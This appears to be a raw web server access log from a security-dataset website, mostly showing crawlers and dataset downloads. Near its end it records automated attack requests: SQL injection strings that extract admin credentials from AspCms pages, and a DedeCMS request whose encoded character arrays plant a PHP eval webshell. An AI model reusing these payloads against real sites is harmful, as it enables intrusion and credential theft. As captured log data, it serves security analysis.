54.36.150.180 - - [10/Mar/2019:03:16:00 -0700] "GET /self.logs/error.log.2016-08-04.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
17.58.100.204 - - [10/Mar/2019:06:21:03 -0700] "GET /self.logs?C=S;O=A HTTP/1.1" 301 517 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.58.100.204 - - [10/Mar/2019:06:21:03 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.58.100.204 - - [10/Mar/2019:06:21:03 -0700] "GET /self.logs/?C=S;O=A HTTP/1.1" 200 17373 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
54.36.148.185 - - [10/Mar/2019:06:26:33 -0700] "GET /self.logs/access.log.2018-02-08.gz HTTP/1.1" 200 21800 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
218.29.102.125 - - [10/Mar/2019:06:24:40 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 549098528 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" 
113.171.224.176 - - [10/Mar/2019:06:29:37 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
41.223.160.131 - - [10/Mar/2019:06:31:00 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
93.151.179.200 - - [10/Mar/2019:06:34:01 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
199.47.87.141 - - [10/Mar/2019:06:40:09 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)" 
199.47.87.141 - - [10/Mar/2019:06:40:09 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)" 
199.47.87.141 - - [10/Mar/2019:06:40:09 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)" 
199.47.87.141 - - [10/Mar/2019:06:40:09 -0700] "GET / HTTP/1.1" 200 12414 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)" 
54.36.149.3 - - [10/Mar/2019:06:54:23 -0700] "GET /self.logs/error.log.2016-09-26.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.138 - - [10/Mar/2019:06:56:39 -0700] "GET /self.logs/2016/error.log.2016-06-20.gz HTTP/1.1" 200 835 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
183.158.119.98 - - [10/Mar/2019:07:00:03 -0700] "POST //index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 295 "http://www.secrepo.com//index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_0 rv:4.0; hy-AM) AppleWebKit/535.10.2 (KHTML, like Gecko) Version/4.1 Safari/535.10.2" 
41.223.160.131 - - [10/Mar/2019:07:00:47 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
199.203.151.209 - - [10/Mar/2019:07:03:20 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
199.203.151.209 - - [10/Mar/2019:07:03:20 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
199.203.151.209 - - [10/Mar/2019:07:03:20 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
199.203.151.209 - - [10/Mar/2019:07:03:20 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
199.203.151.209 - - [10/Mar/2019:07:03:22 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
54.36.148.47 - - [10/Mar/2019:07:07:04 -0700] "GET /self.logs/2015/access.log.2015-11-23.gz HTTP/1.1" 200 8866 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.39 - - [10/Mar/2019:07:13:45 -0700] "GET /self.logs/access.log.2017-05-06.gz HTTP/1.1" 200 21551 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
218.19.145.18 - - [10/Mar/2019:07:15:18 -0700] "GET / HTTP/1.1" 200 12470 "https://www.baidu.com/link?url=nq6YVrw1iGxfCiGaE0-Ma0xQgHMkqHvZhmGxaUgN62chDy2KmxxwnazDlBcarqDe&wd=&eqid=f3f00d5c0000c7c2000000065c851bed" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36" 
218.19.145.18 - - [10/Mar/2019:07:15:20 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36" 
218.19.145.18 - - [10/Mar/2019:07:15:20 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36" 
200.220.199.90 - - [10/Mar/2019:07:18:45 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928460 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.1 Safari/605.1.15" 
111.202.101.81 - - [10/Mar/2019:07:19:58 -0700] "GET /robots.txt HTTP/1.1" 301 481 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
111.202.101.81 - - [10/Mar/2019:07:23:04 -0700] "GET / HTTP/1.1" 301 446 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
111.202.101.81 - - [10/Mar/2019:07:23:05 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
113.251.161.206 - - [10/Mar/2019:07:21:42 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 440640 "https://xz.aliyun.com/t/1879" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240" 
54.36.148.223 - - [10/Mar/2019:07:26:50 -0700] "GET /self.logs/2015/error.log.2015-02-21.gz HTTP/1.1" 200 6475 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
111.202.101.81 - - [10/Mar/2019:07:27:19 -0700] "GET / HTTP/1.1" 200 12433 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
113.251.161.206 - - [10/Mar/2019:07:25:24 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 1068480 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240" 
113.171.224.176 - - [10/Mar/2019:07:32:51 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.195 - - [10/Mar/2019:07:38:53 -0700] "GET /self.logs/access.log.2018-04-26.gz HTTP/1.1" 200 27237 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
46.229.168.129 - - [10/Mar/2019:07:46:39 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; SemrushBot/3~bl; +http://www.semrush.com/bot.html)" 
46.229.168.134 - - [10/Mar/2019:07:46:39 -0700] "GET /Datasets%20Description/Network/N/A HTTP/1.1" 404 303 "-" "Mozilla/5.0 (compatible; SemrushBot/3~bl; +http://www.semrush.com/bot.html)" 
113.250.159.64 - - [10/Mar/2019:07:54:28 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 77760 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:07:54:25 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 110880 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:07:54:26 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 3015360 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:07:54:31 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 2949120 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
54.36.148.213 - - [10/Mar/2019:08:04:12 -0700] "GET /self.logs/access.log.2016-10-28.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.250.159.64 - - [10/Mar/2019:08:00:25 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 1969920 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:08:01:37 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 1658880 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:07:54:30 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 3915360 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
54.36.148.247 - - [10/Mar/2019:08:05:16 -0700] "GET /self.logs/2016/error.log.2016-11-21.gz HTTP/1.1" 200 731 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.250.159.64 - - [10/Mar/2019:08:05:33 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 50131 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:07:54:30 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 4204800 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:08:04:46 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 434880 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:08:05:35 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 132480 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:08:05:36 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 82899 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:08:05:36 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 72000 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:08:05:00 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 331200 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:07:54:31 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 4563360 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.250.159.64 - - [10/Mar/2019:08:04:45 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 459360 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
134.228.4.73 - - [10/Mar/2019:08:12:24 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:12:24 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:12:25 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:12:28 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:12:40 -0700] "GET /self.logs/ HTTP/1.1" 200 15292 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:12:41 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:12:44 -0700] "GET /self.logs/access.log.2017-01-01.gz HTTP/1.1" 200 17655 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:12:59 -0700] "GET /self.logs/access.log.2017-06-15.gz HTTP/1.1" 200 32436 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
54.36.148.254 - - [10/Mar/2019:08:14:18 -0700] "GET /self.logs/2016/access.log.2016-04-24.gz HTTP/1.1" 200 7779 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
134.228.4.73 - - [10/Mar/2019:08:13:10 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 549098528 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:16:31 -0700] "GET /self.logs/ HTTP/1.1" 200 15292 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:16:33 -0700] "GET /self.logs/access.log.2017-01-11.gz HTTP/1.1" 200 91544 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:16:34 -0700] "GET /self.logs/access.log.2017-01-11.gz HTTP/1.1" 200 91545 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:16:39 -0700] "GET /self.logs/access.log.2017-01-11.gz HTTP/1.1" 200 91545 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:17:35 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
134.228.4.73 - - [10/Mar/2019:08:17:58 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 23085976 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
114.115.254.113 - - [10/Mar/2019:08:19:02 -0700] "GET / HTTP/1.1" 200 46424 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.115.254.113 - - [10/Mar/2019:08:19:03 -0700] "POST //lx.php HTTP/1.1" 404 294 "http://www.secrepo.com//lx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
122.114.14.226 - - [10/Mar/2019:08:19:31 -0700] "HEAD / HTTP/1.1" 200 295 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
122.114.14.226 - - [10/Mar/2019:08:19:32 -0700] "HEAD //admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 220 "http://www.secrepo.com//admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
122.114.14.226 - - [10/Mar/2019:08:19:32 -0700] "GET //plug/oem/AspCms_OEM.asp HTTP/1.1" 404 239 "http://www.secrepo.com//plug/oem/AspCms_OEM.asp" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
122.114.14.226 - - [10/Mar/2019:08:19:32 -0700] "HEAD //admin/login.asp?keyword=as&typeArr%5B111%3D@%60%5C%5C%5C'%60)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+%60%23@__admin%60+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@%60%5C%5C%5C'%60+%5D=a HTTP/1.1" 404 220 "http://www.secrepo.com//admin/login.asp?keyword=as&typeArr[111%3D@`\\\\\\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\\\\\\'`+]=a" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
122.114.14.226 - - [10/Mar/2019:08:19:32 -0700] "HEAD //plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20%7Bprefix%7Duser HTTP/1.1" 404 220 "http://www.secrepo.com//plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
122.114.14.226 - - [10/Mar/2019:08:19:33 -0700] "HEAD //plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1" 418 0 "http://www.secrepo.com//plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
122.114.14.226 - - [10/Mar/2019:08:19:33 -0700] "GET //plus/moon.php HTTP/1.1" 404 239 "http://www.secrepo.com//plus/moon.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
122.114.14.226 - - [10/Mar/2019:08:19:33 -0700] "GET //data/mysql_error_trace.inc HTTP/1.1" 404 239 "http://www.secrepo.com//data/mysql_error_trace.inc" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
